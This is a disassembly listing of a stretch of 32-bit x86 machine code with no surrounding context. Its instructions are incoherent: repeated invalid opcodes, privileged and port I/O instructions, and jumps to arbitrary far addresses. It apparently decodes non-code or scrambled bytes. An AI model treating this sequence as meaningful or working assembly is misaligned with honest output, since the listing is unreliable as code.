  411af8:	fadd   QWORD PTR [edi-0x3c717ce2]
  411afe:	push   cs
  411aff:	mov    eax,ds:0x43feb5a9
  411b04:	jmp    0xd24e6b73
  411b09:	sbb    eax,0x6ff41292
  411b0e:	lahf   
  411b0f:	test   al,0x40
  411b11:	dec    esp
  411b12:	or     al,0xfa
  411b14:	pop    ds
  411b15:	dec    DWORD PTR [ebp+edx*8-0x30]
  411b19:	push   edi
  411b1a:	mov    cl,BYTE PTR [ecx-0x72fabfb6]
  411b20:	mov    edx,0x6e6d7c41
  411b25:	neg    DWORD PTR [eax+0x5522026e]
  411b2b:	ret    0x869d
  411b2e:	cmp    ch,0x40
  411b31:	ret    
  411b32:	(bad)  
  411b33:	daa    
  411b34:	jecxz  0x411b3c
  411b36:	ja     0x411b34
  411b38:	sub    DWORD PTR [ebx+0xd],esp
  411b3b:	xor    DWORD PTR [ecx+0x70],ecx
  411b3e:	jp     0x411b1f
  411b40:	(bad)  
  411b41:	mov    esi,0x58297bc1
  411b46:	sahf   
  411b47:	div    cl
  411b49:	jnp    0x411b60
  411b4b:	sbb    DWORD PTR [ebp-0x138bd7bd],esp
  411b51:	jl     0x411ba2
  411b53:	rol    bh,0x5b
  411b56:	pop    es
  411b57:	and    ah,ah
  411b59:	sub    DWORD PTR [edx+edi*4+0x1170486a],0x34
  411b61:	jae    0x411b04
  411b63:	or     DWORD PTR [ecx+eiz*8],eax
  411b66:	lock lods eax,DWORD PTR ds:[esi]
  411b68:	sbb    ecx,DWORD PTR [ebp-0x16]
  411b6b:	mov    BYTE PTR ds:0xb666963d,dl
  411b71:	inc    esp
  411b72:	or     al,0x75
  411b74:	test   dh,cl
  411b76:	div    DWORD PTR [edi]
  411b78:	and    edi,edx
  411b7a:	repnz mov edx,0x629450d4
  411b80:	jge    0x411bf6
  411b82:	pusha  
  411b83:	daa    
  411b84:	pop    es
  411b85:	cld    
  411b86:	shl    DWORD PTR [ebp+0x1b2ca000],1
  411b8c:	icebp  
  411b8d:	cdq    
  411b8e:	cmp    al,0x76
  411b90:	cmp    eax,0x1f30120b
  411b95:	mov    edx,0x8e246117
  411b9a:	mov    eax,0x2be3fc2b
  411b9f:	jp     0x411c00
  411ba1:	dec    ecx
  411ba2:	sub    BYTE PTR [edi-0x64],dl
  411ba5:	push   cs
  411ba6:	fwait
  411ba7:	dec    edx
  411ba8:	mov    esi,0x5ed6c6f
  411bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bae:	imul   esi,DWORD PTR [edi-0x72],0x2d
  411bb2:	ret    0x59db
  411bb5:	lock xchg edx,eax
  411bb7:	dec    ebp
  411bb8:	mov    esp,0x275ab57e
  411bbd:	pop    esi
  411bbe:	sbb    ch,BYTE PTR [edi-0x76091e6c]
  411bc4:	pop    ecx
  411bc5:	mov    cl,0xf8
  411bc7:	or     dh,BYTE PTR [edi+0x58]
  411bca:	sub    eax,edx
  411bcc:	push   0xa214f045
  411bd1:	loopne 0x411c26
  411bd3:	mov    eax,ds:0x4af7ee1f
  411bd8:	jbe    0x411bb4
  411bda:	adc    DWORD PTR [ebp-0x27667c83],0x8
  411be1:	dec    ecx
  411be2:	inc    ebp
  411be3:	sub    ebx,DWORD PTR [ebx+0x1]
  411be6:	push   0x70
  411be8:	ins    BYTE PTR es:[edi],dx
  411be9:	fsubr  QWORD PTR [eax]
  411beb:	rcr    BYTE PTR [edx+0x6b],1
  411bee:	mov    al,0x7d
  411bf0:	add    esp,0xd6b718c5
  411bf6:	adc    al,0xac
  411bf8:	push   edi
  411bf9:	cli    
  411bfa:	adc    ch,bh
  411bfc:	fsub   QWORD PTR [edx+0x49256b60]
  411c02:	add    BYTE PTR [edi+0x567ab825],ah
  411c08:	out    dx,eax
  411c09:	out    0x23,al
  411c0b:	inc    ecx
  411c0c:	shl    cl,cl
  411c0e:	stos   DWORD PTR es:[edi],eax
  411c0f:	int    0x9d
  411c11:	js     0x411bd8
  411c13:	aaa    
  411c14:	js     0x411c67
  411c16:	test   cl,0x69
  411c19:	pop    edx
  411c1a:	sub    al,0x1b
  411c1c:	cmp    al,0xb6
  411c1e:	jmp    0x8301:0xd9604946
  411c25:	dec    edi
  411c26:	mov    ecx,0x8c729f51
  411c2b:	push   ss
  411c2c:	sub    eax,DWORD PTR [ecx+0x3778fe5]
  411c32:	cdq    
  411c33:	jb     0x411c55
  411c35:	push   0x55
  411c37:	outs   dx,BYTE PTR ds:[esi]
  411c38:	cmp    esi,DWORD PTR [edx-0x4d3a26dc]
  411c3e:	ins    BYTE PTR es:[edi],dx
  411c3f:	out    0xef,al
  411c41:	sbb    eax,0x10162408
  411c46:	hlt    
  411c47:	lods   eax,DWORD PTR ds:[esi]
  411c48:	sysret 
  411c4a:	pusha  
  411c4b:	and    dl,bh
  411c4d:	add    al,0x9c
  411c4f:	mov    ecx,0xe05e4a69
  411c54:	sbb    bh,bl
  411c56:	lods   al,BYTE PTR ds:[esi]
  411c57:	pop    eax
  411c58:	mov    ch,0xdf
  411c5a:	pop    esi
  411c5b:	out    dx,al
  411c5c:	or     BYTE PTR [esi+ecx*8-0x25],ch
  411c60:	jp     0x411c06
  411c62:	and    BYTE PTR [edx+0x305c6bf2],cl
  411c68:	nop
  411c69:	nop
  411c6a:	cmp    DWORD PTR [edi],0x79c86df2
  411c70:	adc    BYTE PTR [eax-0x63],dl
  411c73:	js     0x411c2c
  411c75:	scas   eax,DWORD PTR es:[edi]
  411c76:	in     al,0x6b
  411c78:	pop    eax
  411c79:	or     edx,ecx
  411c7b:	stc    
  411c7c:	in     al,0x4b
  411c7e:	or     BYTE PTR [eax-0xa37259a],al
  411c84:	rol    BYTE PTR [edx-0x16b55e4a],cl
  411c8a:	add    DWORD PTR [esi+0x17],ecx
  411c8d:	jecxz  0x411cab
  411c8f:	pop    ds
  411c90:	sbb    BYTE PTR [ecx+0x8683b35],al
  411c96:	xchg   DWORD PTR [esi],esp
  411c98:	inc    ebp
  411c99:	jecxz  0x411cb0
  411c9b:	pop    bx
  411c9d:	xchg   ebp,eax
  411c9e:	add    BYTE PTR [eax-0x2716ba9c],ah
  411ca4:	sti    
  411ca5:	mov    bl,0x1a
  411ca7:	xchg   dh,ch
  411ca9:	test   al,0xf0
  411cab:	test   BYTE PTR [edx+0x2275f7c7],dh
  411cb1:	aam    0x48
  411cb3:	xor    esi,eax
  411cb5:	clc    
  411cb6:	mov    WORD PTR [edi],?
  411cb8:	xor    al,BYTE PTR [ecx-0x5c]
  411cbb:	push   ds
  411cbc:	push   edx
  411cbd:	sbb    BYTE PTR [ecx],dh
  411cbf:	inc    DWORD PTR [eax]
  411cc1:	and    eax,0x1792b418
  411cc6:	jbe    0x411c4f
  411cc8:	mov    DWORD PTR [edi],0x4ef2d663
  411cce:	push   es
  411ccf:	in     al,0xfd
  411cd1:	sbb    DWORD PTR [esi+eax*8-0x35],eax
  411cd5:	add    eax,0x6e91f3cc
  411cda:	xchg   ecx,eax
  411cdb:	inc    ebp
  411cdc:	inc    esi
  411cdd:	xlat   BYTE PTR ds:[ebx]
  411cde:	and    bl,cl
  411ce0:	outs   dx,DWORD PTR ds:[esi]
  411ce1:	ret    
  411ce2:	inc    ebp
  411ce3:	cmp    edx,DWORD PTR ds:0x6ecfc877
  411ce9:	fldenv [edi+0x3e]
  411cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ced:	mov    esi,0x506ccc2f
  411cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf3:	or     eax,0xcbadb85a
  411cf8:	add    al,0x77
  411cfa:	enter  0x4c04,0x74
  411cfe:	loope  0x411cf3
  411d00:	retf   0xd0cd
  411d03:	loopne 0x411d2d
  411d05:	ins    BYTE PTR es:[edi],dx
  411d06:	jns    0x411d37
  411d08:	popw   ds
  411d0a:	jmp    0x411d63
  411d0c:	cmp    eax,0xb06611d
  411d11:	pop    edi
  411d12:	push   es
  411d13:	lods   eax,DWORD PTR ds:[esi]
  411d14:	cdq    
  411d15:	xchg   edi,eax
  411d16:	mov    dl,0x92
  411d18:	fcomp  QWORD PTR [esi]
  411d1a:	jo     0x411cd7
  411d1c:	or     eax,ebp
  411d1e:	dec    edi
  411d1f:	cmp    ebx,0xe5dd63e8
  411d25:	jne    0x411d37
  411d27:	push   es
  411d28:	cmc    
  411d29:	xchg   ebx,eax
  411d2a:	add    DWORD PTR [eax+0x36],ecx
  411d2d:	and    dh,bh
  411d2f:	cli    
  411d30:	lahf   
  411d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d32:	sbb    DWORD PTR ds:0x3e3d3d04,ebp
  411d38:	fldcw  WORD PTR [eax]
  411d3a:	inc    eax
  411d3b:	adc    BYTE PTR [ecx-0x3efa317b],al
  411d41:	cld    
  411d42:	data16 adc bl,BYTE PTR [edi+0x3b4964c2]
  411d49:	jl     0x411d8a
  411d4b:	mov    ecx,0x72cfa00f
  411d50:	and    DWORD PTR [edx+0x6a],0x19
  411d54:	shr    DWORD PTR [ecx+0x541a51f0],0x25
  411d5b:	not    BYTE PTR [edx]
  411d5d:	jp     0x411d95
  411d5f:	jge    0x411db5
  411d61:	sub    BYTE PTR cs:[esi+0x5565b529],dl
  411d68:	(bad)  
  411d69:	call   0xd2daab90
  411d6e:	ror    BYTE PTR [eax-0x306e0aa3],1
  411d74:	mov    ebx,0x57a5133b
  411d79:	dec    ecx
  411d7a:	nop
  411d7b:	daa    
  411d7c:	xchg   ebx,eax
  411d7d:	jp     0x411ddd
  411d7f:	sub    esi,esp
  411d81:	mov    edx,0x317f9def
  411d86:	mov    al,0x9d
  411d88:	cli    
  411d89:	ja     0x411daa
  411d8b:	int3   
  411d8c:	pop    esi
  411d8d:	scas   eax,DWORD PTR es:[edi]
  411d8e:	and    dh,dh
  411d90:	shr    BYTE PTR [ebx-0x7b],1
  411d93:	or     eax,0x5faff7b
  411d98:	xor    ch,BYTE PTR [edi-0x5c]
  411d9b:	sbb    eax,0x165051ed
  411da0:	dec    eax
  411da1:	cli    
  411da2:	xchg   esi,eax
  411da3:	jecxz  0x411def
  411da5:	mov    ch,0xf4
  411da7:	sub    edx,DWORD PTR [edx+0x6b98a049]
  411dad:	jle    0x411db7
  411daf:	imul   edi,DWORD PTR [ecx+eiz*4+0xbffdfe],0xffffffd8
  411db7:	dec    eax
  411db8:	rol    dh,cl
  411dba:	mov    ds:0x3f5e649d,al
  411dbf:	fnstsw WORD PTR [edx+edi*8+0x2b17b3d7]
  411dc6:	outs   dx,BYTE PTR ds:[esi]
  411dc7:	outs   dx,DWORD PTR ds:[esi]
  411dc8:	adc    DWORD PTR [ecx-0x7c],0x1b485c4b
  411dcf:	js     0x411d5d
  411dd1:	or     DWORD PTR [edx+0x5cd94c6c],ebp
  411dd7:	(bad)  
  411dd8:	in     al,0x76
  411dda:	inc    ebp
  411ddb:	add    BYTE PTR [ebp-0x62],dl
  411dde:	cwde   
  411ddf:	cmp    DWORD PTR es:[edi+0x1],ebx
  411de3:	imul   ecx,ebx,0xc14ffb20
  411de9:	les    esi,FWORD PTR [esi]
  411deb:	test   BYTE PTR [ebx+0xf8d2441],bh
  411df1:	call   FWORD PTR [ebx]
  411df3:	mov    ds:0xb1806681,eax
  411df8:	xor    ecx,esp
  411dfa:	push   ebp
  411dfb:	sub    edi,eax
  411dfd:	inc    edx
  411dfe:	gs enter 0x83aa,0xda
  411e03:	ret    0x695d
  411e06:	sbb    BYTE PTR [ebp-0x18],bh
  411e09:	sbb    BYTE PTR [eax-0x1d3895de],dh
  411e0f:	add    DWORD PTR [edx+0x44],edx
  411e12:	pop    ss
  411e13:	dec    esp
  411e14:	xchg   edx,eax
  411e15:	test   DWORD PTR [esi-0x461e1239],edx
  411e1b:	mov    ecx,0x1b5ac31
  411e20:	test   al,0x22
  411e22:	bound  ecx,QWORD PTR [ecx]
  411e24:	test   DWORD PTR [esi-0x1f4bfde9],ebx
  411e2a:	add    al,0xd5
  411e2c:	in     al,dx
  411e2d:	ror    BYTE PTR [edi+0x78999d3e],cl
  411e33:	stos   DWORD PTR es:[edi],eax
  411e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e35:	imul   ebx,DWORD PTR [esi-0x56],0x4258711c
  411e3c:	rcr    DWORD PTR [ebp-0x53],1
  411e3f:	fiadd  DWORD PTR [ebx]
  411e41:	out    dx,al
  411e42:	and    esp,0x38
  411e45:	js     0x411dfb
  411e47:	push   ds
  411e48:	shl    BYTE PTR [edx+0x67],0x6e
  411e4c:	repz icebp 
  411e4e:	inc    ebx
  411e4f:	retf   
  411e50:	pop    esi
  411e51:	inc    ebp
  411e52:	or     DWORD PTR [ebx],eax
  411e54:	mov    bh,0xd1
  411e56:	sub    DWORD PTR [edx-0x3f31e5d8],edx
  411e5c:	cld    
  411e5d:	sar    DWORD PTR [ebx],cl
  411e5f:	iret   
  411e60:	test   al,0x8d
  411e62:	fldln2 
  411e64:	inc    edx
  411e65:	mov    al,ds:0xc903a0fd
  411e6a:	jne    0x411e3e
  411e6c:	not    BYTE PTR [edi+0x7d]
  411e6f:	es cld 
  411e71:	and    ecx,DWORD PTR [ebx-0x553f7855]
  411e77:	push   ds
  411e78:	imul   DWORD PTR [ecx-0x1d]
  411e7b:	or     BYTE PTR [edi-0x3f],0xf1
  411e7f:	sbb    al,0x39
  411e81:	xor    edi,DWORD PTR [edi]
  411e83:	faddp  st(2),st
  411e85:	aaa    
  411e86:	push   esi
  411e87:	sub    DWORD PTR [ecx+0x56],edx
  411e8a:	in     al,dx
  411e8b:	daa    
  411e8c:	cmp    DWORD PTR [esi],ebp
  411e8e:	dec    ebp
  411e8f:	adc    eax,0x290ccf1f
  411e94:	pop    edi
  411e95:	test   BYTE PTR [ebx],0xdb
  411e98:	(bad)  
  411e99:	jmp    0xc2:0x1de527cb
  411ea0:	cs (bad) 
  411ea2:	xor    ah,BYTE PTR [edi*8+0x9ac3825]
  411ea9:	xchg   edi,eax
  411eaa:	adc    bh,dl
  411eac:	into   
  411ead:	scas   al,BYTE PTR es:[edi]
  411eae:	mov    ebx,0xfc854370
  411eb3:	leave  
  411eb4:	lds    esp,FWORD PTR [edx+0x19]
  411eb7:	int3   
  411eb8:	jle    0x411e46
  411eba:	repnz ss popf 
  411ebd:	push   0x25ab3e0
  411ec2:	out    dx,al
  411ec3:	popf   
  411ec4:	daa    
  411ec5:	cmc    
  411ec6:	nop
  411ec7:	xchg   esp,eax
  411ec8:	inc    DWORD PTR ds:0xc40fce41
  411ece:	(bad)  
  411ecf:	dec    edi
  411ed0:	sysret 
  411ed2:	pop    es
  411ed3:	add    ch,dh
  411ed5:	gs mov edi,0xf5bd7f50
  411edb:	in     eax,0x25
  411edd:	xchg   esi,eax
  411ede:	int3   
  411edf:	stos   BYTE PTR es:[edi],al
  411ee0:	arpl   dx,cx
  411ee2:	es rcr ch,1
  411ee5:	adc    BYTE PTR [edi+esi*2+0x21],0xc5
  411eea:	call   0xf8dd:0x2c00f141
  411ef1:	test   al,0xd5
  411ef3:	test   DWORD PTR [ebx-0x6c],eax
  411ef6:	in     eax,0x3d
  411ef8:	cmp    BYTE PTR [esi+0x57],0x76
  411efc:	jne    0x411eca
  411efe:	lahf   
  411eff:	or     al,0x36
  411f01:	cld    
  411f02:	push   0xffffffbb
  411f04:	and    esi,eax
  411f06:	cmp    eax,0x9bd1871b
  411f0b:	xchg   ebp,eax
  411f0c:	movzx  ecx,BYTE PTR [edx+ebp*1-0x342452e9]
  411f14:	out    dx,al
  411f15:	xor    eax,ebx
  411f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f18:	imul   esi,DWORD PTR [ebp+0xc7fe0bd],0x55dab336
  411f22:	xchg   ecx,eax
  411f23:	jmp    0xd2964abb
  411f28:	out    dx,eax
  411f29:	cld    
  411f2a:	mov    ds:0xa248b9fd,al
  411f2f:	cmp    cl,BYTE PTR [esi-0x4c]
  411f32:	mov    esi,0x7c80fbd2
  411f37:	aas    
  411f38:	into   
  411f39:	adc    eax,0xfa260bd5
  411f3e:	cmp    al,0xce
  411f40:	inc    edi
  411f41:	test   eax,0xddd62cda
  411f46:	ret    
  411f47:	jg     0x411ee5
  411f49:	fs cld 
  411f4b:	and    al,BYTE PTR [edi-0x6a4b36a9]
  411f51:	pop    ecx
  411f52:	adc    DWORD PTR [edx],0xffffff9e
  411f55:	mov    ecx,0xa9e5aa9d
  411f5a:	outs   dx,DWORD PTR ds:[esi]
  411f5b:	outs   dx,DWORD PTR ds:[esi]
  411f5c:	jl     0x411f24
  411f5e:	in     eax,0x85
  411f60:	fimul  DWORD PTR [edx-0x65023af8]
  411f66:	test   BYTE PTR [ebx],bh
  411f68:	pop    esi
  411f69:	mov    bh,0xff
  411f6b:	cld    
  411f6c:	adc    esp,ebx
  411f6e:	dec    esi
  411f6f:	mov    ebp,DWORD PTR [ebp+0x21]
  411f72:	pop    ebx
  411f73:	outs   dx,BYTE PTR ds:[esi]
  411f74:	mov    al,0x9
  411f76:	inc    ebx
  411f77:	push   edi
  411f78:	mov    DWORD PTR [esi+eax*1],esp
  411f7b:	push   ebp
  411f7c:	sub    al,0x9e
  411f7e:	sti    
  411f7f:	or     ebp,DWORD PTR [ebp+0x34aaa99f]
  411f85:	aam    0x74
  411f87:	hlt    
  411f88:	xor    BYTE PTR [esi+ebx*8-0x27],bl
  411f8c:	ret    
  411f8d:	dec    ebx
  411f8e:	fst    DWORD PTR [eax+esi*4+0x398404bb]
  411f95:	mov    dl,0x12
  411f97:	cmp    BYTE PTR [ecx+0x4b],bh
  411f9a:	lahf   
  411f9b:	pusha  
  411f9c:	bound  edi,QWORD PTR [edi]
  411f9e:	push   0xa4ac9bc1
  411fa3:	and    DWORD PTR [esi],eax
  411fa5:	das    
  411fa6:	dec    eax
  411fa7:	sbb    al,0x20
  411fa9:	scas   al,BYTE PTR es:[edi]
  411faa:	into   
  411fab:	fs scas ax,WORD PTR es:[edi]
  411fae:	mov    dl,0xa8
  411fb0:	and    ebx,DWORD PTR [ecx-0x9daff49]
  411fb6:	and    ebp,DWORD PTR [ebp+eiz*2+0x243103ee]
  411fbd:	(bad)  
  411fbe:	shl    BYTE PTR [eax+0x3c0d02b4],1
  411fc4:	jmp    0x4450:0xe4839eb4
  411fcb:	push   0xffffffaf
  411fcd:	aaa    
  411fce:	in     eax,dx
  411fcf:	xor    edx,ebp
  411fd1:	fidiv  DWORD PTR [esi*4+0x2195f318]
  411fd8:	xor    DWORD PTR [edi-0x3c1b7325],edx
  411fde:	inc    ebx
  411fdf:	pop    esi
  411fe0:	inc    esp
  411fe1:	jge    0x411fc0
  411fe3:	adc    DWORD PTR [esp+esi*1-0xda216f0],esi
  411fea:	mov    ss,WORD PTR [ebx+0x436985b7]
  411ff0:	sub    eax,0xdabd0240
  411ff5:	icebp  
  411ff6:	and    DWORD PTR [ebp-0x5d58ed7f],edi
  411ffc:	xor    BYTE PTR [esi-0x5cf06957],ah
  412002:	daa    
  412003:	(bad)  
  412004:	outs   dx,BYTE PTR ds:[esi]
  412005:	retf   
  412006:	inc    DWORD PTR [edx]
  412008:	dec    edx
  412009:	dec    eax
  41200a:	mov    ebx,0x430832c7
  41200f:	or     eax,0x2d364585
  412014:	jo     0x411fcd
  412016:	or     ebx,ecx
  412018:	in     eax,0xf
  41201a:	adc    BYTE PTR [edi],ch
  41201c:	stos   BYTE PTR es:[edi],al
  41201d:	and    al,0xf2
  41201f:	sub    eax,0xba7898e0
  412024:	pop    edi
  412025:	call   0xf01a2214
  41202a:	mov    dh,0xd
  41202c:	push   0xffffffa0
  41202e:	retf   0x748f
  412031:	sar    DWORD PTR ds:0xb798f9a,0xba
  412038:	xlat   BYTE PTR ds:[ebx]
  412039:	sub    eax,0xe759a7b6
  41203e:	in     al,dx
  41203f:	sahf   
  412040:	rol    BYTE PTR [esi],0x12
  412043:	push   ecx
  412044:	push   eax
  412045:	test   DWORD PTR [ebp+eiz*4+0x19],0xc4b703f1
  41204d:	xlat   BYTE PTR ds:[ebx]
  41204e:	mov    edi,0xaaebc2b0
  412053:	es fwait
  412055:	test   DWORD PTR [ebx+0x62e9ca8d],edi
  41205b:	mov    DWORD PTR [edx-0x18],ebp
  41205e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41205f:	dec    esi
  412060:	or     DWORD PTR [ebx+0x7f],eax
  412063:	inc    eax
  412064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412065:	lea    ecx,ds:0x4f1971c9
  41206b:	mov    WORD PTR [ecx+0x74391872],es
  412071:	sbb    al,0x7d
  412073:	and    BYTE PTR [ecx],dl
  412075:	mov    edx,0x7050842d
  41207a:	and    eax,0x25ddc52b
  41207f:	out    0x90,al
  412081:	retf   
  412082:	lea    edx,[ecx]
  412084:	scas   al,BYTE PTR es:[edi]
  412085:	mov    eax,DWORD PTR [esi-0x45ade7d4]
  41208b:	fsubr  DWORD PTR [ecx-0x23]
  41208e:	xlat   BYTE PTR ds:[ebx]
  41208f:	adc    BYTE PTR ds:0x3e13ede5,ah
  412095:	push   cs
  412096:	stos   DWORD PTR es:[edi],eax
  412097:	stc    
  412098:	jmp    0x1856:0x69bbf3e0
  41209f:	dec    ecx
  4120a0:	cmp    al,0x97
  4120a2:	sbb    DWORD PTR [esi+0x74],eax
  4120a5:	pop    es
  4120a6:	xchg   BYTE PTR ds:0x8c6bdb5,ch
  4120ac:	jl     0x4120b7
  4120ae:	add    edx,eax
  4120b0:	jne    0x4120ec
  4120b2:	xor    eax,0x3a91e931
  4120b7:	retf   0x158b
  4120ba:	mov    esp,0x9c21a383
  4120bf:	ins    BYTE PTR es:[edi],dx
  4120c0:	sbb    edi,edx
  4120c2:	pop    ecx
  4120c3:	cmp    al,0x32
  4120c5:	(bad)  [edi-0x44c8184b]
  4120cb:	and    BYTE PTR [edi+esi*4-0x7a2a15ec],cl
  4120d2:	mov    eax,0x5299da6d
  4120d7:	xchg   ebp,ecx
  4120d9:	out    dx,al
  4120da:	hlt    
  4120db:	add    al,0x6d
  4120dd:	or     al,0xe7
  4120df:	xor    ch,BYTE PTR [esi]
  4120e1:	push   cs
  4120e2:	fmul   DWORD PTR [eax+0xe]
  4120e5:	xor    bh,BYTE PTR ds:[ebp-0xd]
  4120e9:	aam    0xad
  4120eb:	inc    edi
  4120ec:	mov    ds:0x6656b193,al
  4120f1:	js     0x412170
  4120f3:	adc    edx,ebp
  4120f5:	rcr    edx,1
  4120f7:	sbb    bl,BYTE PTR [ebx]
  4120f9:	jnp    0x412169
  4120fb:	cdq    
  4120fc:	mov    esp,0xce26e4c8
  412101:	adc    ch,BYTE PTR [esi]
  412103:	iret   
  412104:	add    al,0x91
  412106:	(bad)  
  412107:	pop    esp
  412108:	lea    esi,[ecx-0x708e41c1]
  41210e:	popa   
  41210f:	xor    eax,0xb9b4980a
  412114:	xor    BYTE PTR [edx+0x761df90],al
  41211a:	std    
  41211b:	aas    
  41211c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41211d:	loope  0x4120be
  41211f:	mov    eax,ds:0x6e695b0e
  412124:	lock xor esi,DWORD PTR [ecx]
  412127:	sbb    al,0x41
  412129:	sub    ah,BYTE PTR [esi-0xd]
  41212c:	and    edx,ebx
  41212e:	adc    cl,BYTE PTR [ebx]
  412130:	add    edx,DWORD PTR [esi-0x7be4e7c5]
  412136:	push   0xf
  412138:	stos   DWORD PTR es:[edi],eax
  412139:	outs   dx,BYTE PTR ds:[esi]
  41213a:	stos   BYTE PTR es:[edi],al
  41213b:	fcomp  QWORD PTR [edi-0x74cc9375]
  412141:	pop    ds
  412142:	xchg   ebp,eax
  412143:	nop
  412144:	scas   eax,DWORD PTR es:[edi]
  412145:	inc    edx
  412146:	push   es
  412147:	dec    edx
  412148:	hlt    
  412149:	inc    ecx
  41214a:	mov    edi,0xcbd179b
  41214f:	inc    esp
  412150:	cmc    
  412151:	int3   
  412152:	pop    ebp
  412153:	sbb    al,BYTE PTR [esi+eiz*8-0x25]
  412157:	shr    BYTE PTR [eax],cl
  412159:	inc    edx
  41215a:	and    eax,0x3e614801
  41215f:	cdq    
  412160:	or     al,0x2
  412162:	dec    edi
  412163:	dec    ebx
  412164:	xchg   BYTE PTR [edx+eiz*4],ah
  412167:	pop    edi
  412168:	call   0xc5b707dd
  41216d:	fisub  DWORD PTR [esi-0x60]
  412170:	imul   edi,DWORD PTR [ebp-0x23],0x328eaa1c
  412177:	cmp    ah,dh
  412179:	shl    ebx,1
  41217b:	ja     0x412191
  41217d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217e:	xchg   ebx,eax
  41217f:	push   ebx
  412180:	test   eax,0x7ae06d8e
  412185:	jecxz  0x412166
  412187:	sbb    BYTE PTR [edi+ebp*1+0x15dcbd1],0xd8
  41218f:	mov    eax,0xffe00e87
  412194:	sub    DWORD PTR [edi+ebx*8],0xffffffa8
  412198:	xchg   esi,eax
  412199:	jns    0x41218f
  41219b:	jae    0x4121bb
  41219d:	xchg   ecx,eax
  41219e:	xor    al,0x9d
  4121a0:	xor    BYTE PTR [edx],ah
  4121a2:	mov    ch,0xed
  4121a4:	xchg   DWORD PTR [edi-0x6c864439],ecx
  4121aa:	xchg   ebx,eax
  4121ab:	fstp   QWORD PTR [ebx+0x1c]
  4121ae:	and    ebp,DWORD PTR [ecx]
  4121b0:	or     al,0x2d
  4121b2:	int    0x63
  4121b4:	and    ebp,esp
  4121b6:	and    DWORD PTR [eax-0x79f559d4],edi
  4121bc:	sar    DWORD PTR [ebx-0x6c],cl
  4121bf:	in     eax,0x9e
  4121c1:	loopne 0x412242
  4121c3:	dec    ecx
  4121c4:	clc    
  4121c5:	sti    
  4121c6:	pop    edx
  4121c7:	mov    BYTE PTR [eax-0x1016ad88],cl
  4121cd:	push   esp
  4121ce:	(bad)  
  4121cf:	sbb    eax,0x86b2aca4
  4121d4:	hlt    
  4121d5:	or     eax,0x2392375b
  4121da:	sbb    al,0x54
  4121dc:	lock inc eax
  4121de:	pop    ss
  4121df:	icebp  
  4121e0:	(bad)
  4121e3:	push   ss
  4121e4:	fidiv  DWORD PTR [edx]
  4121e6:	(bad)  ds:0xbcb9a54
  4121ec:	sbb    al,0x3b
  4121ee:	dec    ecx
  4121ef:	imul   ecx,eax,0xbc38072d
  4121f5:	and    edi,DWORD PTR [esi+0x728d0158]
  4121fb:	mov    eax,0x580bf4df
  412200:	push   ss
  412201:	jbe    0x4121dd
  412203:	rcl    DWORD PTR [edx-0x3cbbcbf0],0x1
  41220a:	adc    DWORD PTR [esp+eiz*2],edx
  41220d:	cld    
  41220e:	jecxz  0x412198
  412210:	stos   DWORD PTR es:[edi],eax
  412211:	or     bl,bl
  412213:	pop    eax
  412214:	(bad)  
  412215:	out    0x8b,al
  412217:	aaa    
  412218:	(bad)  
  41221a:	xchg   DWORD PTR [edi+0xfad1ad],ecx
  412220:	xchg   esi,eax
  412221:	retf   
  412222:	cmp    al,0xf1
  412224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412225:	pop    esi
  412226:	cmp    DWORD PTR [ebx],ebx
  412228:	ins    BYTE PTR es:[edi],dx
  412229:	test   edx,esp
  41222b:	mov    eax,ecx
  41222d:	push   0xffffffb5
  41222f:	pop    ds
  412230:	pop    edx
  412231:	jne    0x412283
  412233:	hlt    
  412234:	arpl   WORD PTR [edx-0x80],bp
  412237:	dec    ebx
  412238:	push   ecx
  412239:	sbb    dl,ah
  41223b:	shl    DWORD PTR [eax],0x8a
  41223e:	ins    BYTE PTR es:[edi],dx
  41223f:	mov    eax,fs
  412241:	ss jg  0x412261
  412244:	aaa    
  412245:	sbb    al,bl
  412247:	add    eax,0xf843471d
  41224c:	push   es
  41224d:	es pop ecx
  41224f:	gs pop ds
  412251:	jne    0x412235
  412253:	xchg   ebx,eax
  412254:	imul   edi,DWORD PTR [eax],0x9e0896a0
  41225a:	and    eax,0xf97986e3
  41225f:	push   esp
  412260:	outs   dx,BYTE PTR ds:[esi]
  412261:	fild   DWORD PTR ds:0x47a208d9
  412267:	stos   BYTE PTR es:[edi],al
  412268:	(bad)  
  412269:	inc    BYTE PTR [ecx]
  41226b:	int    0x4c
  41226d:	add    DWORD PTR [edx-0x32d936eb],edi
  412273:	mov    ds:0x5d228ad9,eax
  412278:	xchg   ebx,eax
  412279:	sbb    eax,0x9c873d7f
  41227e:	fwait
  41227f:	sub    BYTE PTR [eax-0x108bdb5c],bl
  412285:	mov    ecx,0xa01a6037
  41228a:	test   al,ch
  41228c:	das    
  41228d:	push   ss
  41228e:	mov    edi,0x9290feea
  412293:	sub    di,WORD PTR [ebx+0x49b54cc7]
  41229a:	cld    
  41229b:	retf   0xc555
  41229e:	test   BYTE PTR ds:0x6c6b54c6,0x61
  4122a5:	push   esp
  4122a6:	fst    st(2)
  4122a8:	cmp    ebx,edi
  4122aa:	push   ebp
  4122ab:	out    dx,al
  4122ac:	aad    0x5c
  4122ae:	out    0x61,al
  4122b0:	and    eax,DWORD PTR [ebp-0x746ea05f]
  4122b6:	jae    0x412272
  4122b8:	ds push 0x76
  4122bb:	ins    BYTE PTR es:[edi],dx
  4122bc:	into   
  4122bd:	test   BYTE PTR [esi],bl
  4122bf:	mov    ebp,0x41c15c3
  4122c4:	mov    esp,0x5d9e0e38
  4122c9:	std    
  4122ca:	popa   
  4122cb:	fcom   st(0)
  4122cd:	pop    esp
  4122ce:	sub    DWORD PTR [esp+ebx*1],esp
  4122d1:	fimul  WORD PTR [edi+esi*2+0x6ac2dad1]
  4122d8:	nop
  4122d9:	dec    ebx
  4122da:	add    al,0x26
  4122dc:	aam    0x24
  4122de:	sbb    eax,0x2e99bf96
